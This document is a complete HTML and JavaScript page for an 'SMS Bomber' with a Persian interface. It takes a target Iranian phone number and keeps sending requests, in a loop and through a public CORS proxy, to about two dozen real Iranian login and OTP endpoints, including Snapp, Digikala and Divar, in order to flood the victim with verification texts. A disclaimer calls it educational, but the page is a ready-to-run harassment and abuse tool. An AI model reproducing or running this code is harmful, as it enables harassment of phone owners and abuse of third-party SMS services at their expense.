<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber Web App</title>
    <!-- Tailwind CSS for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Vazirmatn', sans-serif;
            background-color: #111827; /* Dark background */
        }
        /* Custom scrollbar for the log */
        #log::-webkit-scrollbar {
            width: 8px;
        }
        #log::-webkit-scrollbar-track {
            background: #1f2937;
        }
        #log::-webkit-scrollbar-thumb {
            background-color: #4f46e5;
            border-radius: 10px;
            border: 2px solid #1f2937;
        }
        /* Blinking cursor effect */
        .blinking-cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background-color: #6ee7b7;
            animation: blink 1s step-end infinite;
            margin-right: 5px;
        }
        @keyframes blink {
            from, to { background-color: transparent }
            50% { background-color: #6ee7b7; }
        }
    </style>
</head>
<body class="text-gray-200">

    <div class="container mx-auto p-4 md:p-8 max-w-3xl">

        <!-- Header -->
        <header class="text-center mb-8">
            <h1 class="text-4xl md:text-5xl font-black text-white mb-2">
                SMS Bomber <span class="text-indigo-500">Cactus</span>
            </h1>
            <p class="text-gray-400 flex justify-center items-center">
                ابزار تحت وب برای ارسال پیامک 
                <span id="apiCounter" class="bg-indigo-500 text-white text-xs font-bold mr-2 px-2.5 py-0.5 rounded-full">...</span>
            </p>
        </header>

        <!-- Disclaimer -->
        <div class="bg-red-900/50 border border-red-700 text-red-300 px-4 py-3 rounded-lg relative mb-8" role="alert">
            <strong class="font-bold">هشدار:</strong>
            <span class="block sm:inline">این ابزار فقط برای اهداف آموزشی و تست نفوذ قانونی ساخته شده است. هرگونه استفاده نادرست و غیرقانونی از این ابزار بر عهده کاربر است و سازنده هیچ مسئولیتی در قبال آن ندارد.</span>
        </div>

        <!-- Control Panel -->
        <div class="bg-gray-800 p-6 rounded-2xl shadow-lg border border-gray-700">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <!-- Phone Number Input -->
                <div>
                    <label for="phoneNumber" class="block mb-2 text-sm font-medium text-gray-300">شماره تلفن هدف</label>
                    <input type="tel" id="phoneNumber" class="bg-gray-900 border border-gray-600 text-gray-200 text-sm rounded-lg focus:ring-indigo-500 focus:border-indigo-500 block w-full p-3 text-left" placeholder="09123456789" dir="ltr" required>
                </div>
                <!-- Delay Input -->
                <div>
                    <label for="delay" class="block mb-2 text-sm font-medium text-gray-300">تاخیر بین هر درخواست (ثانیه)</label>
                    <input type="number" id="delay" value="1" min="0.5" step="0.1" class="bg-gray-900 border border-gray-600 text-gray-200 text-sm rounded-lg focus:ring-indigo-500 focus:border-indigo-500 block w-full p-3 text-left" placeholder="1" dir="ltr" required>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
                <button id="startButton" class="w-full text-white bg-indigo-600 hover:bg-indigo-700 focus:ring-4 focus:outline-none focus:ring-indigo-500 font-bold rounded-lg text-md px-5 py-3.5 text-center transition-colors duration-300">
                    شروع حمله
                </button>
                <button id="stopButton" class="w-full text-white bg-red-600 hover:bg-red-700 focus:ring-4 focus:outline-none focus:ring-red-500 font-bold rounded-lg text-md px-5 py-3.5 text-center transition-colors duration-300" disabled>
                    توقف
                </button>
            </div>
        </div>

        <!-- Log/Status Area -->
        <div class="mt-8">
            <h2 class="text-xl font-bold text-white mb-4 flex items-center">
                <span class="blinking-cursor"></span>
                لاگ عملیات
            </h2>
            <div id="log" class="bg-black text-sm font-mono p-4 rounded-lg h-64 overflow-y-auto border border-gray-700">
                <p class="text-gray-500">> منتظر شروع عملیات...</p>
            </div>
        </div>

    </div>

    <script>
        // DOM Elements
        const phoneInput = document.getElementById('phoneNumber');
        const delayInput = document.getElementById('delay');
        const startButton = document.getElementById('startButton');
        const stopButton = document.getElementById('stopButton');
        const logArea = document.getElementById('log');
        const apiCounter = document.getElementById('apiCounter');

        let isBombing = false;

        // --- Helper Functions ---
        function log(message, type = 'info') {
            const p = document.createElement('p');
            let colorClass = 'text-gray-400';
            let prefix = 'INFO';
            switch (type) {
                case 'success': colorClass = 'text-green-400'; prefix = 'SUCCESS'; break;
                case 'error': colorClass = 'text-red-400'; prefix = 'ERROR'; break;
                case 'warning': colorClass = 'text-yellow-400'; prefix = 'WARN'; break;
            }
            p.className = `${colorClass} break-words`;
            p.innerHTML = `<span class="text-gray-500">[${new Date().toLocaleTimeString()}]</span> <span class="${colorClass} font-bold">[${prefix}]</span> ${message}`;
            logArea.appendChild(p);
            logArea.scrollTop = logArea.scrollHeight;
        }
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        function formatPhoneNumber(phone) {
            const cleaned = phone.replace(/\s+/g, '');
            if (/^09[0-9]{9}$/.test(cleaned)) return `+98${cleaned.substring(1)}`;
            if (/^989[0-9]{9}$/.test(cleaned)) return `+${cleaned}`;
            if (/^\+989[0-9]{9}$/.test(cleaned)) return cleaned;
            return null;
        }

        // --- API Definitions ---
        const PROXY_URL = 'https://api.allorigins.win/raw?url=';
        const apiList = [
            // Standard APIs
            { name: 'Snapp', method: 'POST', url: 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', body: (p) => JSON.stringify({ cellphone: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Tapsi', method: 'POST', url: 'https://tap33.me/api/v2/user', body: (p) => JSON.stringify({ credential: { phoneNumber: `0${p.substring(3)}`, role: "PASSENGER" } }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Divar', method: 'POST', url: 'https://api.divar.ir/v5/auth/authenticate', body: (p) => JSON.stringify({ phone: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Sheypoor', method: 'POST', url: 'https://www.sheypoor.com/auth', body: (p) => new URLSearchParams({ username: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
            { name: 'AliBaba', method: 'POST', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', body: (p) => JSON.stringify({ phoneNumber: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
            { name: 'SnappFood', method: 'POST', url: 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418', body: (p) => new URLSearchParams({ cellphone: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
            { name: 'Torob', method: 'GET', url: (p) => `https://api.torob.com/a/phone/send-pin/?phone_number=0${p.substring(3)}` },
            { name: 'Banimode', method: 'POST', url: 'https://mobapi.banimode.com/api/v2/auth/request', body: (p) => JSON.stringify({ phone: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json', 'platform': 'web' } },
            { name: 'Digikala', method: 'POST', url: 'https://api.digikala.com/v1/user/authenticate/', body: (p) => JSON.stringify({ username: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
            
            // New APIs from Python script & research
            { name: 'Gap', method: 'GET', url: (p) => `https://core.gap.im/v1/user/add.json?mobile=%2B${p.substring(1)}` },
            { name: 'SnappMarket', method: 'POST', url: (p) => `https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0${p.substring(3)}` },
            { name: 'GapFilm', method: 'POST', url: 'https://core.gapfilm.ir/api/v3.1/Account/Login', body: (p) => JSON.stringify({ Type: 3, Username: p.substring(3) }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Filmnet', method: 'GET', url: (p) => `https://api-v2.filmnet.ir/access-token/users/${p}/otp` },
            { name: 'DrDr', method: 'POST', url: 'https://drdr.ir/api/registerEnrollment/sendDisposableCode', body: (p) => JSON.stringify({ phoneNumber: p, userType: "PATIENT" }), headers: { 'Content-Type': 'application/json;charset=UTF-8' } },
            { name: 'iToll', method: 'POST', url: 'https://app.itoll.ir/api/v1/auth/login', body: (p) => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Baskool', method: 'POST', url: 'https://www.buskool.com/send_verification_code', body: (p) => JSON.stringify({ phone: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Kilid', method: 'POST', url: 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', body: (p) => JSON.stringify({ mobile: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Basalam', method: 'POST', url: 'https://api.basalam.com/user', body: (p) => JSON.stringify({ "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }", "variables": { "mobile": `0${p.substring(3)}` } }), headers: { 'Content-Type': 'application/json' } },
            { name: 'Simkhan', method: 'POST', url: 'https://www.simkhanapi.ir/api/users/registerV2', body: (p) => JSON.stringify({ mobileNumber: `0${p.substring(3)}`, ReSendSMS: false }), headers: { 'Content-Type': 'application/json' } },
            { name: 'DrSaina', method: 'POST', url: 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation', body: (p) => new URLSearchParams({ action: 'checkIfUserExistOrNot', PhoneNumber: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
            { name: 'Binjo', method: 'GET', url: (p) => `https://api.binjo.ir/api/panel/get_code/0${p.substring(3)}` },
            { name: 'MihanPezeshk', method: 'POST', url: 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient', body: (p) => new URLSearchParams({ mobile: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
            { name: 'HamrahMechanic', method: 'POST', url: 'https://www.hamrah-mechanic.com/api/v1/auth/login', body: (p) => JSON.stringify({ phoneNumber: `0${p.substring(3)}` }), headers: { 'Content-Type': 'application/json' } },
        ];
        
        // Update API counter on page load
        document.addEventListener('DOMContentLoaded', () => {
            apiCounter.textContent = `${apiList.length} API`;
        });

        async function callApi(api, phone) {
            if (!isBombing) return;
            log(`ارسال درخواست به ${api.name}...`);
            try {
                const targetUrl = typeof api.url === 'function' ? api.url(phone) : api.url;
                const proxyRequestUrl = `${PROXY_URL}${encodeURIComponent(targetUrl)}`;
                const body = api.body ? (typeof api.body === 'function' ? api.body(phone) : api.body) : null;
                const response = await fetch(proxyRequestUrl, {
                    method: api.method,
                    headers: api.headers || {},
                    body: body,
                });
                if (response.ok) {
                    log(`درخواست به ${api.name} با موفقیت ارسال شد.`, 'success');
                } else {
                    throw new Error(`Status: ${response.status} ${response.statusText}`);
                }
            } catch (error) {
                log(`خطا در ارسال درخواست به ${api.name}: ${error.message}`, 'error');
            }
        }

        async function startBombing() {
            const phoneNumberRaw = phoneInput.value;
            const delaySeconds = parseFloat(delayInput.value);
            const phone = formatPhoneNumber(phoneNumberRaw);
            if (!phone) {
                log('شماره تلفن وارد شده معتبر نیست. لطفاً فرمت صحیح را وارد کنید (مثال: 09123456789).', 'error');
                return;
            }
            if (isNaN(delaySeconds) || delaySeconds < 0) {
                log('مقدار تاخیر نامعتبر است.', 'error');
                return;
            }
            isBombing = true;
            startButton.disabled = true;
            stopButton.disabled = false;
            phoneInput.disabled = true;
            delayInput.disabled = true;
            logArea.innerHTML = '';
            log(`عملیات برای شماره ${phone} شروع شد.`, 'warning');
            let round = 1;
            while (isBombing) {
                log(`--- شروع راند ${round} ---`, 'info');
                const shuffledApis = [...apiList].sort(() => Math.random() - 0.5);
                for (const api of shuffledApis) {
                    if (!isBombing) break;
                    await callApi(api, phone);
                    await sleep(delaySeconds * 1000);
                }
                if (!isBombing) break;
                log(`--- پایان راند ${round} ---`, 'info');
                round++;
            }
            if (!isBombing) {
                log('عملیات توسط کاربر متوقف شد.', 'warning');
            }
            startButton.disabled = false;
            stopButton.disabled = true;
            phoneInput.disabled = false;
            delayInput.disabled = false;
        }

        function stopBombing() {
            isBombing = false;
            stopButton.disabled = true;
            log('در حال توقف عملیات...', 'warning');
        }

        startButton.addEventListener('click', startBombing);
        stopButton.addEventListener('click', stopBombing);
    </script>
</body>
</html>
